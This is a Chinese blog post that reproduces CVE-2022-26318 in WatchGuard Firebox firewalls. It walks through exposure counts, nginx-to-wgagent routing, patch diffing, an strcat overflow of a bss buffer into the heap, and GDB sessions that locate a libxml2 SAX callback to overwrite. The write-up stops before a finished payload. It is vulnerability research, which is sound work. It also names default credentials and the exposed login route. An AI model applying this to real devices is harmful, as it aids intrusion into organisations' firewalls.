<html>
<head>
    <meta charset="utf-8" />
<meta name="description" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1" />

<title>CVE-2022-26318 watchguard 防火墙漏洞复现 | 飞光</title>

<link rel="shortcut icon" href="https://blog.augustu.top/favicon.ico?v=1721984284030">

<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.augustu.top/styles/main.css">
<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->

<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>

<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
<!-- DEMO JS -->
<!--<script src="media/scripts/index.js"></script>-->


<script async src="https://www.googletagmanager.com/gtag/js?id=G-9LQ8M10P2E"></script>
<script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'G-9LQ8M10P2E');
</script>


    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
    
</head>
<body>
<div class="main gt-bg-theme-color-first">
    <nav class="navbar navbar-expand-lg">
    <a class="navbar-brand" href="/">
        <img class="user-avatar" src="/images/avatar.png" alt="头像">
        <div class="site-name gt-c-content-color-first">
            飞光
        </div>
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <div class="navbar-nav mr-auto" style="text-align: center">
            
            <div class="nav-item">
                
                <a href="/" class="menu gt-a-link">
                    首页
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/archives" class="menu gt-a-link">
                    归档
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/tags" class="menu gt-a-link">
                    标签
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/post/about" class="menu gt-a-link">
                    关于
                </a>
                
            </div>
            
        </div>
        <div style="text-align: center">
            <form id="gridea-search-form" style="position: relative" data-update="1721984284030"
                action="/search/">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
            </form>
        </div>
    </div>
</nav>
<script>
    /* 移动端导航栏展开/收起切换 */
    document.getElementById('changeNavbar').onclick = () => {
        var element = document.getElementById('navbarSupportedContent');
        if (element.style.display === 'none' || element.style.display === '') {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    }
</script>

    <div class="post-container">
        <div class="post-detail gt-bg-theme-color-second">
            <article class="gt-post-content">
                <h2 class="post-title">
                    CVE-2022-26318 watchguard 防火墙漏洞复现
                </h2>
                <div class="post-info">
                    <time class="post-time gt-c-content-color-first">
                        · 2024-07-04 ·
                    </time>
                    
                        <a href="https://blog.augustu.top/tag/eebvwWSSW/" class="post-tags">
                            # 技术
                        </a>
                    
                        <a href="https://blog.augustu.top/tag/nvjcETb7ou/" class="post-tags">
                            # IOT
                        </a>
                    
                </div>
                <div class="post-content">
                    <h4 id="资产探测">资产探测</h4>
<ul>
<li>
<p>fofa大概能找到77万左右的ip，主要面向北美和欧洲市场</p>
<ul>
<li>美国51万多</li>
<li>德国26万</li>
<li>意大利22万</li>
<li>英国11万</li>
<li>法国9万多</li>
</ul>
</li>
<li>
<p>中小型企业是其主要群体</p>
</li>
<li>
<p>终端安全领域 市场份额 8.59%</p>
<table>
<thead>
<tr>
<th><a href="https://6sense.com/tech/endpoint-security/sophos-market-share">Sophos</a></th>
<th>9,331</th>
<th>20.72%</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://6sense.com/tech/endpoint-security/trend-micro-market-share">Trend Micro</a></td>
<td>5,971</td>
<td>13.26%</td>
</tr>
<tr>
<td><a href="https://6sense.com/tech/endpoint-security/qualys-market-share">Qualys</a></td>
<td>3,261</td>
<td>7.24%</td>
</tr>
<tr>
<td><a href="https://6sense.com/tech/endpoint-security/symantec-endpoint-protection-market-share">Symantec Endpoint Protection</a></td>
<td>3,059</td>
<td>6.79%</td>
</tr>
<tr>
<td><a href="https://6sense.com/tech/endpoint-security/openvpn-market-share">OpenVPN</a></td>
<td>2,608</td>
<td>5.79%</td>
</tr>
<tr>
<td><a href="https://6sense.com/tech/endpoint-security/landesk-market-share">LANDESK</a></td>
<td>2,363</td>
<td>5.25%</td>
</tr>
<tr>
<td><a href="https://6sense.com/tech/endpoint-security/microsoft-defender-for-endpoint-market-share">Microsoft Defender for Endpoint</a></td>
<td>1,632</td>
<td>3.62%</td>
</tr>
</tbody>
</table>
<p>单纯防火墙领域占有率较少，但占有率在上升，截至2024年6月，WatchGuard Firebox在防火墙类别中的市场份额为4.1%，前一年3.1%，这里我找了防火墙领域的一些数据</p>
<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620150910393.png?x-oss-process=style/zip" alt="image-20240620150910393" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620145912994.png?x-oss-process=style/zip" alt="image-20240620145912994" loading="lazy"></figure>
<table>
<thead>
<tr>
<th><strong>Vendor</strong></th>
<th><strong>4Q22 Revenue</strong></th>
<th><strong>4Q22 Market Share</strong></th>
<th><strong>4Q21 Revenue</strong></th>
<th><strong>4Q21 Market Share</strong></th>
<th><strong>4Q22/4Q21 Growth</strong></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1. Palo Alto Networks</td>
<td>$973.75</td>
<td>15.9%</td>
<td>$883.35</td>
<td>15.1%</td>
<td>10.2%</td>
<td></td>
</tr>
<tr>
<td>3. Fortinet</td>
<td>$966.61</td>
<td>15.8%</td>
<td>$776.23</td>
<td>13.3%</td>
<td>24.5%</td>
<td></td>
</tr>
<tr>
<td>2. Cisco</td>
<td>$921.08</td>
<td>15.8%</td>
<td>$885.79</td>
<td>15.2%</td>
<td>4.0%</td>
<td></td>
</tr>
<tr>
<td>4. Check Point</td>
<td>$473.04</td>
<td>7.7%</td>
<td>$462.55</td>
<td>7.9%</td>
<td>2.3%</td>
<td></td>
</tr>
<tr>
<td>5. SonicWALL</td>
<td>$194.16</td>
<td>3.2%</td>
<td>$183.50</td>
<td>3.1%</td>
<td>5.8%</td>
<td></td>
</tr>
<tr>
<td>Rest of Market</td>
<td>$2,582.05</td>
<td>42.3%</td>
<td>$2,645.27</td>
<td>45.3%</td>
<td>-2.4%</td>
<td></td>
</tr>
<tr>
<td><strong>Total</strong></td>
<td><strong>$6,110.69</strong></td>
<td><strong>100.0%</strong></td>
<td><strong>$5,836.70</strong></td>
<td><strong>100.0%</strong></td>
<td><strong>4.7%</strong></td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>全系产品os通用问题</p>
<p><code>FireboxV</code>在虚拟化平台（如 VMware、Hyper-V）上运行， Firebox T 系列和 M 系列是物理防火墙设备，都运行 WatchGuard 的 Fireware 操作系统，核心功能和操作系统在所有防火墙产品上是通用的</p>
</li>
<li>
<p>web界面</p>
<p>web界面可以通过8080端口访问，默认密码admin:readwrite</p>
<figure data-type="image" tabindex="3"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240617151738438.png?x-oss-process=style/zip" alt="image-20240617151738438" loading="lazy"></figure>
</li>
<li>
<p>历史高危漏洞数量</p>
<p>40个，其中19年2个，21年5个，22年14个，23年5个，24年7个</p>
</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240617152232235.png?x-oss-process=style/zip" alt="image-20240617152232235" loading="lazy"></figure>
<h3 id="路由及功能分析"><strong>路由及功能分析</strong></h3>
<p>从公开信息看，漏洞出现在登录认证处理过程中。WatchGuard 前端为 Nginx，后端为二进制程序，使用 Unix domain socket 通过 fastcgi 代理转发协议进行前后端数据交互。</p>
<p><code>wgagent</code> 是 WireGuard 的一个代理程序，通常用于管理 WireGuard 的网络接口和密钥，以及提供一些额外的功能，比如自动重新连接和网络监控。</p>
<p>跟之前<code>FortiGate</code>中着重利用的<code>sslvpn</code>有相同有不同，它们用于实现虚拟私人网络（VPN）连接，但它们在实现方式和使用场景上有所区别</p>
<ol>
<li><strong>技术基础</strong>：
<ul>
<li><code>wgagent</code> 是与 WireGuard VPN 协议相关联的代理程序。WireGuard 是一种基于内核的 VPN 解决方案，使用自己的加密协议来创建安全的网络隧道。</li>
<li>SSL VPN 则是利用 Web 浏览器和 SSL/TLS 协议来实现远程访问的一种 VPN 技术。</li>
</ul>
</li>
<li><strong>使用方式</strong>：
<ul>
<li><code>wgagent</code> 通常与 WireGuard 一起使用，可能需要在客户端设备上配置 WireGuard 并运行 <code>wgagent</code> 来管理连接。</li>
<li>SSL VPN 允许用户通过 Web 浏览器直接访问 VPN，无需安装额外的客户端软件。</li>
</ul>
</li>
<li><strong>配置和部署</strong>：
<ul>
<li>WireGuard 和 <code>wgagent</code> 可能需要在操作系统级别进行配置，包括设置网络接口和密钥。</li>
<li>SSL VPN 通常通过 Web 界面进行配置，用户通过浏览器访问 VPN 门户，进行身份验证和连接。</li>
</ul>
</li>
<li><strong>适用场景</strong>：
<ul>
<li>WireGuard 和 <code>wgagent</code> 适用于需要高性能、低延迟的 VPN 连接，尤其是在需要设备到设备或点对点连接的场景。</li>
<li>SSL VPN 更适合于需要快速部署、易于访问的远程工作解决方案，特别是当用户可能使用多种不同的设备和平台时。</li>
</ul>
</li>
<li><strong>安全性和性能</strong>：
<ul>
<li>WireGuard 设计上注重安全性和性能，提供了现代的加密标准和高效的数据传输。</li>
<li>SSL VPN 利用了广泛支持的 SSL/TLS 加密，确保了数据传输的安全性，但其性能可能受到浏览器和网络条件的限制。</li>
</ul>
</li>
</ol>
<p>可以在 Nginx 中看到配置了 wgagent 的代理转发功能：</p>
<pre><code class="language-sh">/etc/nginx # grep -nr &quot;wgagent&quot; ./
./nginx.conf:7:    # rpc calls exposed by wgagent
./nginx.conf:8:    include    /etc/nginx/http-server-wgagent;
./nginx.conf:31:    # webui, and subset of wgagent needed by webui and local processes
./http-server-webui:29:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
./http-server-webui:31:        # wgagent is FCGI-native, needs DOCUMENT_ROOT, SCRIPT_NAME.
./http-server-wgagent:14:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
./http-server-wgagent:19:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
./http-server-wgagent:22:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
./http-server-wgagent:25:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
./http-server-wgagent:28:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
</code></pre>
<p>使用<code>lsof</code>查看此文件被进程占用情况，最后定位到 <code>/usr/bin/wgagent</code></p>
<pre><code>~ # lsof /usr/share/web/upload/tmp/wgagent
……
2536    /usr/bin/python 10      /dev/urandom
2537    /usr/bin/wgagent        0       /dev/null
2537    /usr/bin/wgagent        1       /dev/null
2537    /usr/bin/wgagent        2       /dev/null
2537    /usr/bin/wgagent        3       socket:[6759]
2537    /usr/bin/wgagent        4       socket:[6760]
2537    /usr/bin/wgagent        5       socket:[6786]
2537    /usr/bin/wgagent        6       socket:[6817]
2537    /usr/bin/wgagent        7       socket:[6818]
2537    /usr/bin/wgagent        8       socket:[6819]
……
</code></pre>
<p>查看<code>Nginx</code>配置文件</p>
<pre><code>~ # cat /etc/nginx/nginx.conf

include        /etc/nginx/global;

http {
    include    /etc/nginx/http-common;

    # rpc calls exposed by wgagent
    include    /etc/nginx/http-server-wgagent;
……

    # webui, and subset of wgagent needed by webui and local processes
    include    /etc/nginx/http-server-webui;
……
}
</code></pre>
<p>可以确定两种触发路由，但最终实现的效果相同，都是与 <code>/usr/share/web/upload/tmp/wgagent</code> 文件进行数据交互到达 <code>/usr/bin/wgagent</code> 程序中</p>
<pre><code class="language-nginx">/etc/nginx # cat http-server-webui
server {
    listen              127.0.0.1:80;
    include             /var/run/nginx/webui-port;
……
    location /agent/ {
        root            /usr/share/web/webui;
        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
        include         fastcgi_params;
        # wgagent is FCGI-native, needs DOCUMENT_ROOT, SCRIPT_NAME.
        fastcgi_param   SCRIPT_NAME $fastcgi_script_name;
        # /agent/file_action can take a while, e.g. backup
        fastcgi_read_timeout    10m;
    }
}
</code></pre>
<pre><code class="language-nginx">/etc/nginx # cat /etc/nginx/http-server-wgagent
server {
    listen              4117 ssl;
    listen              [::]:4117 ssl;
    location /login {   # no trailing slash
        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
    }
……
    location /agent/ {
        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
        # /agent/file_action can take a while, e.g. backup
        fastcgi_read_timeout    10m;
    }
    ……
}
</code></pre>
<p>4117 端口开放在全网卡上可对外访问，因此漏洞路由为 <code>https://ip:4117/login</code> 或者是 <code>https://ip:4117/agent/login</code>。</p>
<p>抓一个登录包</p>
<pre><code>POST /agent/login HTTP/1.1
Host: 192.168.150.13:8080
Cookie: session_id=b1d3391f9234af711618d438e7c1fe9d47307612
Content-Length: 413
Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;
Accept: application/xml, text/xml, */*; q=0.01
Content-Type: text/xml
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: &quot;Windows&quot;
Origin: https://192.168.150.13:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.150.13:8080/auth/login?from_page=/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1, i
Connection: keep-alive

&lt;methodCall&gt;&lt;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;root&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;augustu&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;domain&lt;/name&gt;&lt;value&gt;&lt;string&gt;Firebox-DB&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;uitype&lt;/name&gt;&lt;value&gt;&lt;string&gt;2&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;
</code></pre>
<p>可以看出 WatchGuard 在登录认证部分使用 XML 数据进行交互，这就意味着在 WatchGuard 服务中肯定存在 XML 数据解析代码</p>
<h3 id="定位漏洞点">定位漏洞点</h3>
<p>尝试通过补丁对比，大概定位到漏洞点。</p>
<p>学习了一下<code>bindiff</code>的使用，找到<code>watchguard</code>历史文件下载位置</p>
<figure data-type="image" tabindex="5"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618160506152.png?x-oss-process=style/zip" alt="image-20240618160506152" loading="lazy"></figure>
<p>大概了解了一下以后，创建<code>v12.8</code>版本虚拟机并且下载对应<code>wgagent</code>文件，通过<code>bindiff</code>进行分析</p>
<figure data-type="image" tabindex="6"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618162736253.png?x-oss-process=style/zip" alt="image-20240618162736253" loading="lazy"></figure>
<p>按相似度排列逐个分析后，最终找到<code>sub_4067EF</code>中删除了 <code>strcat</code> 危险函数，猜测漏洞出在这里</p>
<figure data-type="image" tabindex="7"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618162453080.png?x-oss-process=style/zip" alt="image-20240618162453080" loading="lazy"></figure>
<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618163729503.png?x-oss-process=style/zip" alt="image-20240618163729503" style="zoom:200%;" />
<h3 id="逻辑梳理">逻辑梳理</h3>
<p>在 <code>wgagent</code> 中存在路由匹配规则，程序收到的 <code>/login</code> 以及 <code>/agent/login</code> 数据将会进入 <code>sub_40B737</code> 函数处理：</p>
<pre><code class="language-c">  if ( s1 &amp;&amp; (!strcmp(s1, &quot;/login&quot;) || !strcmp(s1, &quot;/agent/login&quot;)) )
  {
    sub_40B737(&amp;ptr, tp.tv_sec, tp.tv_nsec);
    goto LABEL_396;
  }
</code></pre>
<p>此函数的开始部分会解析来自 POST 包中的 XML 数据，处理逻辑如下：</p>
<pre><code class="language-c">  if ( (int)wglog_diag_level(0xFFFFFFFFLL) &gt; 3 )
  {
    v1 = (const char *)FCGX_GetParam(&quot;HTTP_USER_AGENT&quot;, v43[4]);
    wglog_trace_r(0xFFFFFFFFLL, 4LL, 7LL, &quot;src/modules/wgagent/main.c&quot;, 2558LL, &quot;wga_login&quot;, &quot;user-agent = '%s'&quot;, v1);
  }
  v2 = FCGX_GetParam(&quot;HTTP_CONTENT_ENCODING&quot;, v43[4]);
  v42 = xml_parse(v43[1], v2);    // xml解析
  if ( !v42 || !*(_QWORD *)(v42 + 120) )
  {
    sub_40740D(v43[2], 400LL, &quot;Invalid XML-RPC request&quot;);
    FCGX_FFlush(v43[2]);
    return 0LL;
  }
</code></pre>
<p>漏洞就在 <code>xml_parse（0x40869D）</code> 函数，主要是因为 WatchGuard 自己写的 XML 回调函数中对 bss 段上的数据进行赋值，并产生缓冲区溢出，使得超长部分数据溢出到堆上。经过分析代码找到了存储在 bss 段上的变量，如下所示：</p>
<pre><code class="language-c">  if ( ptr )
  {
    v23 = xmlCreatePushParserCtxt(s, ptr, 0LL, 0LL, &quot;filename&quot;);
    if ( v23 )
    {
      ::s[0] = 0;                            //存储在 bss 段上的变量
      bzero(haystack, 0x186A0uLL);
      do
      {
        v33 = FCGX_GetStr(haystack, v22, a1);
</code></pre>
<pre><code>.bss:0000000000427360 s               db 400h dup(?)          ; DATA XREF: sub_406797+14↑o
.bss:0000000000427360                                         ; sub_4067EF:loc_406D54↑o ...
</code></pre>
<p>知道了缓冲区的位置，尝试在 <code>wgagent</code> 程序中定位真正的漏洞点，查看使用了 <code>s</code> 变量的位置：</p>
<figure data-type="image" tabindex="8"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618165653502.png?x-oss-process=style/zip" alt="image-20240618165653502" loading="lazy"></figure>
<p>定位到之前猜测的位置</p>
<figure data-type="image" tabindex="9"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618165808639.png?x-oss-process=style/zip" alt="image-20240618165808639" loading="lazy"></figure>
<p>继续分析上下文代码，寻找如何控制 <code>a2</code> 变量：</p>
<pre><code class="language-C">switch ( *(_DWORD *)(a1 + 80) )
      {
        case 1:
          if ( strcasecmp(a2, &quot;methodName&quot;) )
          {
            result = (int *)a1;
            ++*(_DWORD *)(a1 + 76);
            return result;
          }
          *(_DWORD *)(a1 + 80) = 2;
          break;
        case 3:
          if ( !strcasecmp(a2, &quot;member&quot;) )
</code></pre>
<p><code>a2</code> 看起来是 xml 文档中的标签值，应该是函数解析的 xml 文档标签。尝试通过漏洞调试验证。</p>
<h3 id="gdb调试">GDB调试</h3>
<p>按照之前<code>FortiGate</code>的经验，应该是尝试上传<code>gdbserver</code></p>
<p>上传以后成功开启GDBserver</p>
<figure data-type="image" tabindex="10"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618181903257.png?x-oss-process=style/zip" alt="image-20240618181903257" loading="lazy"></figure>
<figure data-type="image" tabindex="11"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618182133450.png?x-oss-process=style/zip" alt="image-20240618182133450" loading="lazy"></figure>
<p>这里一开始以为是端口问题，尝试了一下感觉可能得放行防火墙端口，网上看了一下确实有人用的这种方法，但这里需要密钥，我尝试注册获得，但<code>watchguard</code>必须得有序列号，一个设备对应一个码，因为只是虚拟机没能成功获得</p>
<figure data-type="image" tabindex="12"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619104808497.png?x-oss-process=style/zip" alt="image-20240619104808497" loading="lazy"></figure>
<p>最后尝试直接在终端使用命令来配置，用 <code>iptables</code> 对所有数据包放行，发现可以成功连接远程<code>gdbserver</code></p>
<pre><code>iptables -I INPUT 1 -i eth0 -j ACCEPT
gdbserver --attach 0.0.0.0:15432 $(busybox pidof wgagent)
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619105225411.png?x-oss-process=style/zip" alt="image-20240619105225411" loading="lazy"></figure>
<p>根据原登录请求改了一个<code>XML</code>报文，具体如下</p>
<pre><code>POST /agent/login HTTP/1.1
Host: 192.168.150.13:8080
Cookie: sessionid=0204F13453FD8152BAD1473ED8B7B3CE92175ABA; session_id=9e5e779fb01c9e5d4e26d04ae39133785c220e1c
Content-Length: 410
Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;, &quot;Microsoft Edge&quot;;v=&quot;126&quot;
Accept: application/xml, text/xml, */*; q=0.01
Content-Type: text/xml
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
Sec-Ch-Ua-Platform: &quot;Windows&quot;
Origin: https://192.168.150.13:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.150.13:8080/auth/login
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: keep-alive

&lt;methodCall&gt;
   &lt;methodName&gt;test&lt;/methodName&gt;
      &lt;params&gt;
         &lt;param&gt;
            &lt;value&gt;&lt;double&gt;aaaa&lt;/double&gt;&lt;/value&gt;
         &lt;/param&gt;
      &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p>成功在调用<code>strcat</code>处断住</p>
<figure data-type="image" tabindex="14"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619150648601.png?x-oss-process=style/zip" alt="image-20240619150648601" loading="lazy"></figure>
<p>尝试发送任意<code>XML</code>报文，发现报错，并且没有在上述函数处断住</p>
<figure data-type="image" tabindex="15"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619151041760.png?x-oss-process=style/zip" alt="image-20240619151041760" loading="lazy"></figure>
<p>也就是说，必须要发送<code>XML-RPC</code>格式的数据</p>
<h3 id="漏洞利用">漏洞利用</h3>
<h4 id="堆溢出">堆溢出</h4>
<p>尝试在此断点处使用<code>x/s $rdi</code>打印<code>strcat</code>第一个参数，如下</p>
<pre><code>pwndbg&gt; i b
Num     Type           Disp Enb Address            What
5       breakpoint     keep y   0x0000000000406d99 
        breakpoint already hit 2 times
        x/s $rdi
</code></pre>
<p>发现会打印如下内容</p>
<pre><code>0x427360:       &quot;/&quot;
0x427360:       &quot;/methodCall/&quot;
0x427360:       &quot;/methodCall/&quot;
0x427360:       &quot;/methodCall/params/&quot;
0x427360:       &quot;/methodCall/params/param/&quot;
0x427360:       &quot;/methodCall/params/param/value/&quot;
</code></pre>
<p>因为在<code>逻辑梳理</code>部分中，已经确定<code>0x427360</code>的变量就在<code>.bss</code>段上，也就是说 <code>strcat</code> 会将标签拼接在一起放在<code> bss</code> 段上</p>
<p>猜想：如果发包时控制一下，是否可以通过<code>strcat</code>溢出到堆上</p>
<p>查看当前进程的内存映射，发现目标地址<code>0x427360</code>位于堆<code>0x428000</code>之前的块中，看来溢出到堆上进行堆利用的想法是可行的</p>
<pre><code class="language-sh">pwndbg&gt; info proc mapping
process 2899
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x405000     0x5000        0x0 /usr/bin/wgagent
            0x405000           0x41e000    0x19000     0x5000 /usr/bin/wgagent
            0x41e000           0x425000     0x7000    0x1e000 /usr/bin/wgagent
            0x425000           0x426000     0x1000    0x24000 /usr/bin/wgagent
            0x426000           0x428000     0x2000    0x25000 /usr/bin/wgagent
</code></pre>
<h3 id="溢出-xml-sax-handler-结构体">溢出 XML SAX Handler 结构体</h3>
<p>上面GDB调试的时候发现，每解析一个标签，<code>sub_4067EF</code>就会被回调一次，那么如果能够覆盖回调函数为任意地址，就可以实现劫持程序执行流了</p>
<p>使用<code>peda</code>在内存中搜索 <code>0x4067ef</code></p>
<pre><code>gdb-peda$ find 0x4067ef  
Searching for '0x4067ef' in: None ranges  
Found 2 results, display max 2 items:  
 [heap] : 0x429e68 --&gt; 0x4067ef (push   rbp)  
[stack] : 0x7ffcefb22c68 --&gt; 0x4067ef (push   rbp)
</code></pre>
<p>找到了两处地址，分别在堆上和栈上</p>
<p>查看一下内存</p>
<pre><code>gdb-peda$ x/10w 0x429e68-0x10
0x429e58:       0xdeedbeaf      0x00000000      0x00000000      0x00000000
0x429e68:       0x004067ef      0x00000000      0x00406dce      0x00000000
0x429e78:       0x00000000      0x00000000
</code></pre>
<p>这里我感觉<code> 0xdeedbeaf</code>这个数值得注意，一般来说这是一个常用的魔数，我把它跟<code>SAX</code>在一起搜索，没什么结果</p>
<p>后面我去简单学习了一下<code>SAX</code>,它是一种用于解析XML文档的事件驱动API，允许应用程序在解析XML文档时响应各种事件，如元素的开始和结束、文本数据的读取等，最后发现这个API是通过<code>libxml2</code>实现的，当我一起搜索<code>libxml2</code>与<code>0xdeedbeaf</code>时，发现此魔数是<code>libxml2</code>指定的魔数</p>
<figure data-type="image" tabindex="16"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627145455370.png?x-oss-process=style/zip" alt="image-20240627145455370" loading="lazy"></figure>
<p>那么很明显了，这里就是<code>SAX</code>处理结构</p>
<p><strong>不重要部分：</strong></p>
<p>开始 ROP之前需要保证 栈上的数据是可控的，搜索栈空间查看是否有可控的数据</p>
<pre><code>gdb-peda$ find &quot;methodName&quot;
Searching for 'methodName' in: None ranges
Found 7 results, display max 7 items:
wgagent : 0x41e9ef (&quot;methodName&quot;)
 [heap] : 0x432be5 (&quot;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/valu&quot;...)
 [heap] : 0x432bf7 (&quot;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&quot;...)
 [heap] : 0x436dad (&quot;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/valu&quot;...)
 [heap] : 0x436dbf (&quot;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&quot;...)
